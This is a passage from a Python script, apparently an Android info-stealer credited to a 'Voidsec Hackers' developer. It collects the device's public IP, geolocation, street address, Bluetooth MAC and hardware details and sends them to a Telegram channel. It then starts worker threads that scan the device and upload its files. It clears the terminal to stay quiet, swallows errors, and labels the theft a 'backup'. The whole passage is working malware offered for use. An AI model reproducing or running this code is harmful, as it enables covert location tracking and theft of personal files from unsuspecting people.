        "paired_devices_count": paired_devices_count,
        "bluetooth_mac": bluetooth_mac,
        "nfc_status": nfc_status,
        "airplane_mode": airplane_mode,
        "mobile_data": mobile_data,
        "wifi_status": wifi_status,
        "hotspot_status2": hotspot_status2,
        "tethering_status": tethering_status,
        "system_time": system_time,
        "time_since_charge": time_since_charge,
        "processes_count": processes_count,
        "installed_apps_count": installed_apps_count,
    }
    return snapshot

def build_message_from_snapshot(snap):
    ip4 = snap.get("public_ipv4")
    geo = snap.get("geo", {})
    lat = geo.get("latitude") or geo.get("lat")
    lon = geo.get("longitude") or geo.get("lon")
    combined_id = None
    if ip4 and lat and lon:
        combined_id = f"{ip4}|{lat},{lon}"
    elif ip4:
        combined_id = f"{ip4}|N/A"

    lines = []
    lines.append("<b>[== INFORMATIONS ==]</b>\n")
    lines.append("<b>➥🌍 Location & IP</b>")
    lines.append(f"➣IPv4 Address: {ip4 or 'N/A'}")
    lines.append(f"➣IPv6 Address: {snap.get('public_ipv6') or 'N/A'}")
    lines.append(f"➣Combined ID: {combined_id or 'N/A'}")
    lines.append(f"➣City: {geo.get('city') or 'N/A'}")
    lines.append(f"➣Region: {geo.get('region') or 'N/A'}")
    lines.append(f"➣Country: {geo.get('country_name') or geo.get('country') or 'N/A'}")
    if lat and lon:
        lines.append(f"➣Map Location: https://www.google.com/maps/search/?api=1&query={lat},{lon}")
        lines.append(f"➣Latitude: {lat}, Longitude: {lon}")
    else:
        lines.append("➣Latitude/Longitude: N/A")
    rd = snap.get("reverse_geocode") or {}
    if rd.get("display_name"):
        lines.append(f"➣Reverse Geocode Addr: {rd.get('display_name')}")
    lines.append(f"➣IP Org/ISP: {snap.get('ipinfo', {}).get('org') or geo.get('org') or 'N/A'}")
    lines.append(f"➣IP Hostname: {snap.get('ipinfo', {}).get('hostname') or 'N/A'}")
    lines.append("\n<b>➥📱 Device/System Info</b>")
    for k, v in (snap.get("device_info") or {}).items():
        if v is not None and v != "":
            lines.append(f"➣{k.replace('_',' ').title()}: {v}")
    lines.append(f"➣Battery: {snap.get('battery', {}).get('percentage') or 'N/A'}%  {snap.get('battery_bars')}")
    lines.append(f"➣Storage Free (MB): {snap.get('device_info', {}).get('storage_free_mb', 'N/A')}")
    lines.append(f"➣CPU: {snap.get('cpu', {}).get('model') or 'N/A'} | cores: {snap.get('cpu', {}).get('cores')}")
    
    # Additional info summary
    lines.append("\n<b>➥📊 Additional Info</b>")
    lines.append(f"➣Kernel Version: {snap.get('kernel_version', 'N/A')}")
    lines.append(f"➣Architecture: {snap.get('architecture', 'N/A')}")
    lines.append(f"➣RAM Size: {snap.get('ram_size', 'N/A')}")
    lines.append(f"➣Free RAM: {snap.get('free_ram', 'N/A')}")
    lines.append(f"➣Storage Size: {snap.get('storage_size', 'N/A')}")
    lines.append(f"➣Free Storage: {snap.get('free_storage', 'N/A')}")
    lines.append(f"➣SD Card Size: {snap.get('sdcard_size', 'N/A')}")
    lines.append(f"➣SD Card Free: {snap.get('sdcard_free', 'N/A')}")
    lines.append(f"➣Screen Resolution: {snap.get('screen_resolution', 'N/A')}")
    lines.append(f"➣Installed Apps: {snap.get('installed_apps_count', 'N/A')}")
    
    lines.append("\n<b>[== DEVELOPER ==]</b>")
    lines.append("➥♛Mr. Dark Hcktvst♛")
    lines.append("➥Team:☠Voidsec Hackers☠")
    return "\n".join(lines)

# Main
def run():
    # Clear terminal for quiet operation
    clear_terminal()
    
    # 1) collect everything
    snapshot = collect_full_snapshot()

    # 2) create combined id string for ease of reference (ip|lat,lon)
    ip4 = snapshot.get("public_ipv4")
    geo = snapshot.get("geo") or {}
    lat = geo.get("latitude") or geo.get("lat")
    lon = geo.get("longitude") or geo.get("lon")
    combined_id = None
    if ip4 and lat and lon:
        combined_id = f"{ip4}|{lat},{lon}"
    elif ip4:
        combined_id = f"{ip4}|N/A"
    snapshot["combined_id"] = combined_id

    # 3) build and send message
    msg = build_message_from_snapshot(snapshot)
    try:
        send_telegram_message(msg)
    except:
        pass

    # 4) save JSON locally and upload it
    json_path = "device_info_full_snapshot.json"
    try:
        with open(json_path, "w", encoding="utf-8") as jf:
            json.dump(snapshot, jf, ensure_ascii=False, indent=2)
        send_telegram_file(json_path, caption="device_info_full_snapshot.json")
    except Exception:
        pass

    # 5) start uploader workers
    workers = []
    for i in range(WORKERS):
        t = threading.Thread(target=consumer_worker, args=(i+1,), daemon=True)
        t.start()
        workers.append(t)

    # 6) producer scan
    try:
        producer_scan()
        file_queue.join()
    except KeyboardInterrupt:
        stop_flag.set()
    finally:
        stop_flag.set()
        for w in workers:
            w.join(timeout=2)

    # 7) final summary
    clear_terminal()
    print("=== Backup finished ===\n")
    print(f"Found files: {counters['found']}")
    print(f"Queued files: {counters['queued']}")
    print(f"Sent files: {counters['sent']}")
    print(f"Skipped (too big/unreadable): {counters['skipped']}")
    print(f"Upload errors/skips: {counters['errors']}\n")

    print("=== Device info (summary) ===")
    for k, v in (snapshot.get("device_info") or {}).items():
        if v:
            print(f"{k}: {v}")

    print("\n=== Network / Location (summary) ===")
    if ip4:
        print(f"IPv4: {ip4}")
        if lat and lon:
            print(f"Latitude: {lat}, Longitude: {lon}")
            rd = snapshot.get("reverse_geocode") or {}
            if rd.get("display_name"):
                print(f"Reverse geocode address: {rd.get('display_name')}")
        else:
            print("Latitude/Longitude: unavailable")
        ipinfo = snapshot.get("ipinfo") or {}
        if ipinfo:
            print(f"IP Org/ISP: {ipinfo.get('org') or 'N/A'}")
            print(f"IP Hostname: {ipinfo.get('hostname') or 'N/A'}")
    else:
        print("Public IP / location: unavailable")

if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        clear_terminal()
        print("Fatal error:", e)
        sys.exit(1)
